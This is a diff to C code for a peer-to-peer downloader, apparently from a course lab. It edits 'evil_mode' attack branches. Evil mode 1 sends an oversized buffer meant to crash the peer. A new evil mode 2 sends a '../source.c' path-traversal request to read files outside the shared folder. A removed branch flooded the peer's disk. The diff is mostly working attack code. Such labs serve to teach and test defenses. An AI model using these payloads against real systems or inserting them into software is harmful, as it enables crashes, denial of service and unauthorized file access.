@@ -528,29 +528,24 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 	if( evil_mode == 1){
 
-	  t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-	  if (t->peer_fd == -1) {
-	    error("* Cannot connect to peer: %s\n", strerror(errno));
-	    goto try_again;
-	  }
-
-	  message("buffer overflow to crash downloader");
+       	  message("* Buffer overflow to crash downloader");
 	  
-	  char evilBuffer[FILENAMESIZ*2];
+	  char evilBuffer[FILENAMESIZ*10];
 
-	  memset(evilBuffer, 'A', FILENAMESIZ*2);
+	  memset(evilBuffer, 'A', FILENAMESIZ*10);
 	  
 	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evilBuffer);
 	}
 
+	if(evil_mode == 2){
+	  
+	  char bad_file[FILENAMESIZ] = "../source.c";
+	 
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", bad_file);
+	}
+
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
-	if(evil_mode == 2){
-	  while(osp2p_writef(t->peer_fd, "A", 1) > 0)
-	    ;
-	  message("Disk is now full.");
-	  goto try_again;
-	}
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
